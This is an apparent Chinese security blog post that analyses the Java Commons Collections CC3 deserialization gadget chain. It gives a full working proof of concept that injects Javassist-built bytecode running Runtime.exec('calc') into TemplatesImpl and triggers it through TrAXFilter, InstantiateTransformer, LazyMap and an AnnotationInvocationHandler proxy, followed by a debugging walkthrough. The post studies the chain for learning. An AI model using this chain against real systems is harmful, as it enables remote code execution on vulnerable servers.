# 0x00 前言

在学习完成前面的CC1链和CC2链后，其实再来看CC3链会比较轻松。

CC1的利用链是Map(Proxy).entrySet()触发AnnotationInvocationHandler.invoke()，而CC2链的利用链是通过InvokerTransformer.transform()调用newTransformer触发RCE。这里就不说这么详细感兴趣可以看前面几篇文章。听说CC3链是CC1和CC2链的结合体。下面来分析一下CC3链。

## 0x01 前置知识

在CC3利用链的构造里面其实没有用到很多的新的一些知识点，但是有用到新的类，还是需要记录下来。

### InstantiateTransformer

首先还是查看一下构造方法。

![1603274714_5f9007da0edea5914be85.png!small?1603274714097](https://image.3001.net/images/20201021/1603274714_5f9007da0edea5914be85.png!small?1603274714097)

在查看下面的代码的时候会发现他的transform方法非常的有意思。

![1603274743_5f9007f718603254815fc.png!small?1603274743359](https://image.3001.net/images/20201021/1603274743_5f9007f718603254815fc.png!small?1603274743359)

transform方法会去使用反射实例化一个对象并且返回。

### TrAXFilter

查看TrAXFilter的构造方法，会发现更有意思的事情。

![1603274758_5f900806981b202808558.png!small?1603274758922](https://image.3001.net/images/20201021/1603274758_5f900806981b202808558.png!small?1603274758922)

_transformer = (TransformerImpl)
templates.newTransformer();调用了传入参数的newTransformer()方法。在CC2链分析的时候，使用的是反射调用newTransformer,newTransformer调用defineTransletClasses()。最后再调用_class.newInstance()实例化_class对象。那么如果是使用TrAXFilter的话，就不需要InvokerTransformer的transform方法反射去调用了。

## 0x02 POC分析

    
    
    package com.test;  
      
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
    import javassist.CannotCompileException;  
    import javassist.ClassPool;  
    import javassist.CtClass;  
    import javassist.NotFoundException;  
    import org.apache.commons.collections.Transformer;  
    import org.apache.commons.collections.functors.ChainedTransformer;  
    import org.apache.commons.collections.functors.ConstantTransformer;  
    import org.apache.commons.collections.functors.InstantiateTransformer;  
    import org.apache.commons.collections.map.LazyMap;  
    import javax.xml.transform.Templates;  
    import java.io.*;  
    import java.lang.reflect.*;  
    import java.util.HashMap;  
    import java.util.Map;  
    ​  
    public class cc1 {  
    ​  
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IOException, IllegalAccessException, InvocationTargetException, InstantiationException, NotFoundException, CannotCompileException, NoSuchFieldException {  
    String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";  
    String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";  
    ​  
    ClassPool classPool=ClassPool.getDefault();  
    classPool.appendClassPath(AbstractTranslet);  
    CtClass payload=classPool.makeClass("CommonsCollections333333333");  
    payload.setSuperclass(classPool.get(AbstractTranslet));  
    payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");  
    ​  
    byte[] bytes=payload.toBytecode();  
    ​  
    Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();  
    Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");  
    field.setAccessible(true);  
    field.set(templatesImpl,new byte[][]{bytes});  
    ​  
    Field field1=templatesImpl.getClass().getDeclaredField("_name");  
    field1.setAccessible(true);  
    field1.set(templatesImpl,"test");  
    ​  
    ​  
    Transformer[] transformers=new Transformer[]{  
    new ConstantTransformer(TrAXFilter.class),  
    new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})  
    };  
    ​  
    ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);  
    Map map=new HashMap();  
    Map lazyMap= LazyMap.decorate(map,chainedTransformer);  
    ​  
    Class cls=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
    Constructor constructor=cls.getDeclaredConstructor(Class.class,Map.class);  
    constructor.setAccessible(true);  
    ​  
    InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Override.class,lazyMap);  
    Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler);  
    Object object=constructor.newInstance(Override.class,map1);  
    ​  
    ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));  
    outputStream.writeObject(object);  
    outputStream.close();  
    ​  
    ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));  
    inputStream.readObject();  
    }  
    }  
    ​

上面是一段POC代码，先来分析一下，POC为什么要这样去构造。

    
    
    String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";  
    String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";  
    ​  
    ClassPool classPool=ClassPool.getDefault();  
    classPool.appendClassPath(AbstractTranslet);  
    CtClass payload=classPool.makeClass("CommonsCollections22222222222");  
    payload.setSuperclass(classPool.get(AbstractTranslet));  
    payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");  
    ​  
    byte[] bytes=payload.toBytecode();

先来执行一遍看一下执行的结果。

![1603274770_5f900812716ee19bd6e59.png!small?1603274771053](https://image.3001.net/images/20201021/1603274770_5f900812716ee19bd6e59.png!small?1603274771053)

能够执行成功并且弹出计算器。

其实看到代码前面部分，和CC2利用链的构造是一模一样的。在CC2链中分析文章里面讲到过。这里就来简单概述一下。

[Java安全之Commons
Collections2分析](https://www.cnblogs.com/nice0e3/p/13816574.html)

这里是采用了Javassist方式创建一个类，然后设置该类的主体为Runtime.exec("clac.exe")，设置完成后，将该类转换成字节码。

    
    
    Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();  
    Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");  
    field.setAccessible(true);  
    field.set(templatesImpl,new byte[][]{bytes});  
    ​  
    Field field1=templatesImpl.getClass().getDeclaredField("_name");  
    field1.setAccessible(true);  
    field1.set(templatesImpl,"test");

反射获取TemplatesImpl类的_bytecodes成员变量，设置值为上面使用Javassist类转换后的字节码。

反射获取TemplatesImpl类的_name成员变量，设置值为test。

    
    
    Transformer[] transformers=new Transformer[]{  
    new ConstantTransformer(TrAXFilter.class),  
    new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})  
    };  
    ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);

ConstantTransformer在调用transform方法的时候，会遍历的去调用数组里面transform方法。并且将执行结果传入到第二次遍历执行的参数里面。

![1603274821_5f900845a2aeae44fd7d8.png!small?1603274821748](https://image.3001.net/images/20201021/1603274821_5f900845a2aeae44fd7d8.png!small?1603274821748)

第一次执行this.iTransformers[i]为ConstantTransformer。所以，调用的是ConstantTransformer的transform方法该方法是直接返回传入的对象。这里返回了个TrAXFilter.class对象。

![1603274864_5f900870dc01991b7012a.png!small?1603274865133](https://image.3001.net/images/20201021/1603274864_5f900870dc01991b7012a.png!small?1603274865133)

而在第二次遍历执行的时候传入的就是TrAXFilter.class对象，然后再反射的去获取方法，使用newInstance实例化一个对象并且进行返回。

![1603274873_5f90087925e051ae7ed9f.png!small?1603274873434](https://image.3001.net/images/20201021/1603274873_5f90087925e051ae7ed9f.png!small?1603274873434)

    
    
    Map map=new HashMap();  
    Map lazyMap= LazyMap.decorate(map,chainedTransformer);

这里是将上面构造好的ChainedTransformer的实例化对象，传入进去。在调用lazyMap的get方法的时候，就会去调用构造好的ChainedTransformer对象的transform方法。

![1603274884_5f900884ee33dab1683d5.png!small?1603274885244](https://image.3001.net/images/20201021/1603274884_5f900884ee33dab1683d5.png!small?1603274885244)

那么下面就会引出lazyMap的get方法的调用问题，再来看下面一段代码。

    
    
    Class cls=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
    Constructor constructor=cls.getDeclaredConstructor(Class.class,Map.class);  
    constructor.setAccessible(true);  
    ​  
    InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Override.class,lazyMap);  
    Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler);  
    Object object=constructor.newInstance(Override.class,map1);

反射创建了一个AnnotationInvocationHandler对象，传入Override.class和lazyMap的对象，并使用AnnotationInvocationHandler作为调用处理器，为lazyMap做一个动态代理。关于这里为什么要传入一个Override.class的问题，其实因为AnnotationInvocationHandler本来就是一个处理注解的类，构造方法的第⼀个参数是⼀个Annotation类类型参数，第二个是map类型参数（所有的注解类型都继承自这个Annotation接口）。在这里面不管传入的是Retention.class还是Override.class都是可行的。

这的lazyMap作为被代理的对象后，调用任意的方法都会去执行调用处理器的invoke方法。AnnotationInvocationHandler实现了InvocationHandler，可以被当作调用处理器传入。而我们在这时候调用lazyMap的任意方法的话，就会执行一次AnnotationInvocationHandler中的invoke方法。而在AnnotationInvocationHandler的invoke方法中就会调用get方法。

![1603274892_5f90088c7d20990477c8f.png!small?1603274892711](https://image.3001.net/images/20201021/1603274892_5f90088c7d20990477c8f.png!small?1603274892711)

在调用get方法后又回到了前面说到的地方，这里就会去调用transform方法去完成后面的命令执行。这里先不细说。

![1603274905_5f9008992cf511fc64f86.png!small?1603274905188](https://image.3001.net/images/20201021/1603274905_5f9008992cf511fc64f86.png!small?1603274905188)

在分析完POC代码后其实并没有去看到一个完整的调用链，这里有必要去调试一遍。

## 0x03 CC3链调试

先在AnnotationInvocationHandler的readobject方法中去打个断点进行调试分析

![1603274913_5f9008a1b9acf4b27ec15.png!small?1603274913882](https://image.3001.net/images/20201021/1603274913_5f9008a1b9acf4b27ec15.png!small?1603274913882)

在这里可以看到这里的this.memberValues的值为被代理的lazyMap的对象，调用了lazyMap的entrySet方法。那么这时候被代理对象的调用处理器的invoke方法会执行。前面说过使用的AnnotationInvocationHandler作为调用处理器，这里调用的就是AnnotationInvocationHandler的invoke方法，跟进一下invoke方法。

![1603274924_5f9008ac3067385fc2972.png!small?1603274924535](https://image.3001.net/images/20201021/1603274924_5f9008ac3067385fc2972.png!small?1603274924535)

invoke方法在内部调用了lazyMap的get方法，再来跟进一下get方法。

![1603274930_5f9008b2079146dc41c0f.png!small?1603274930135](https://image.3001.net/images/20201021/1603274930_5f9008b2079146dc41c0f.png!small?1603274930135)

到这里其实就能看到了this.factory.transform(key);,调用了transform方法，在这里的this.factory为ChainedTransformer的实例化对象。再来跟进一下transform方法就能看到ChainedTransformer的transform内部的调用结构。

![1603274936_5f9008b8b0d1fb1434297.png!small?1603274937362](https://image.3001.net/images/20201021/1603274936_5f9008b8b0d1fb1434297.png!small?1603274937362)

在POC构造的时候为ChainedTransformer这个对象传入了一个数组，数组的第一值为ConstantTransformer实例化对象，第二个为InstantiateTransformer实例化对象。

所以在这里第一次遍历this.iTransformers[i]的值为ConstantTransformer。ConstantTransformer的transform会直接返回传入的对象。在POC代码构造的时候，传入的是TrAXFilter对象，所以在这里会直接进行返回TrAXFilter,并且会作为第二次遍历的传参值。

![1603274943_5f9008bfe13c903142d1a.png!small?1603274944369](https://image.3001.net/images/20201021/1603274943_5f9008bfe13c903142d1a.png!small?1603274944369)

而在第二次遍历的时候，this.iTransformers[i]的值为InstantiateTransformer的实例化对象。所以调用的是InstantiateTransformer的transform方法并且传入了TrAXFilter对象。跟进一下InstantiateTransformer的transform方法。

![1603274950_5f9008c6b7f03a0570c24.png!small?1603274950945](https://image.3001.net/images/20201021/1603274950_5f9008c6b7f03a0570c24.png!small?1603274950945)

这里其实是比较有意思的，刚刚传入的是TrAXFilter对象，所以这里的input为TrAXFilter，this.iParamTypes为Templates，this.iArgs为构造好的恶意TemplatesImpl实例化对象。（这里之所以说他是恶意的TemplatesImpl对象是因为在前面使用反射将他的_bytecodes设置成了一个使用javassist动态创建的恶意类的字节码）。

该transform方法中使用getConstructor方法获取TrAXFilter参数为Templates的构造方法。

![1603274958_5f9008ce7128524064a4c.png!small?1603274958659](https://image.3001.net/images/20201021/1603274958_5f9008ce7128524064a4c.png!small?1603274958659)

使用该构造方法创建一个对象，并且传入恶意的TemplatesImpl实例化对象。在该构造方法当中会调用TemplatesImpl的newTransformer方法。跟进一下newTransformer方法。

![1603275026_5f9009127a7a447009e24.png!small?1603275026953](https://image.3001.net/images/20201021/1603275026_5f9009127a7a447009e24.png!small?1603275026953)

newTransformer方法内部调用了getTransletInstance方法再跟进一下。

![1603275035_5f90091ba82905aadc76a.png!small?1603275035778](https://image.3001.net/images/20201021/1603275035_5f90091ba82905aadc76a.png!small?1603275035778)

这里可以看到先是判断了_name的值是否为空，为空的话就会执行返回null，不向下执行。这也是前面为什么使用反射获取并且修改_name值的原因。

下面一步是判断_class是否为空，显然我们这里的_class值是null，这时候就会调用defineTransletClasses方法，跟进一下。

![1603275045_5f90092587a5570a792b7.png!small?1603275045873](https://image.3001.net/images/20201021/1603275045_5f90092587a5570a792b7.png!small?1603275045873)

下面标注出来这段是_bytecodes对_class进行赋值，这里的_bytecodes的值是使用javassist动态创建的恶意类的字节码
执行完后，来到下一步。

![1603275054_5f90092eb53880618a3c6.png!small?1603275054822](https://image.3001.net/images/20201021/1603275054_5f90092eb53880618a3c6.png!small?1603275054822)![1603275062_5f900936be9412ca9ff48.png!small?1603275063128](https://image.3001.net/images/20201021/1603275062_5f900936be9412ca9ff48.png!small?1603275063128)这里会对该字节码进行调用newInstance方法实例化一个对象，然后就可以看到命令执行成功。

![1603275116_5f90096caffae9060dac8.png!small?1603275117194](https://image.3001.net/images/20201021/1603275116_5f90096caffae9060dac8.png!small?1603275117194)

关于这个为什么调用newInstance实例化一个对象，命令就直接执行成功的问题，其实我的在CC2链分析里面也说到过，主要还是看使用javassist动态创建一个类的时候，他是怎么去构造的。

    
    
    ClassPool classPool=ClassPool.getDefault();  
    classPool.appendClassPath(AbstractTranslet);  
    CtClass payload=classPool.makeClass("CommonsCollections22222222222");  
    payload.setSuperclass(classPool.get(AbstractTranslet));  payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");   
    payload.writeFile("./");

先将该类写出来到文件中，然后再去查看。

![1603275139_5f9009831f5613e712933.png!small?1603275139116](https://image.3001.net/images/20201021/1603275139_5f9009831f5613e712933.png!small?1603275139116)

看到这个其实就一目了然了，使用setBody设置主体的时候，代码其实是插入在静态代码块中的。静态代码块的代码在实例化对象的时候就会进行执行。

### 调用链

    
    
    AnnotationInvocationHandler.readobject->(proxy)lazyMap.entrySet
    ->AnnotationInvocationHandler.invoke->lazyMap.get
    ->ChainedTransformer.transform->ConstantTransformer.transform
    ->InstantiateTransformer.transform->TrAXFilter(构造方法)
    ->TemplatesImpl.newTransformer->TemplatesImpl.getTransletInstance
    ->TemplatesImpl.defineTransletClasses
    ->(动态创建的类)cc2.newInstance()->Runtime.exec()

## 0x04 结尾

其实在调试CC3这条利用链的时候，会发现前半部分使用的是CC2利用链的POC代码，而后半部分则是CC1的利用链代码。调试过这两条利用链的话，调试CC3这条利用链会比较简单易懂。

在写这篇文的时候，第一次刚码完字，电脑就蓝屏了。重新打开文件的时候，文章的文件也清空了。只能重写一遍，但是重写完后，发现虽然字数也差不多，但是感觉细节点的地方还是少了东西，但是又不知道具体在哪些地方少了，害。

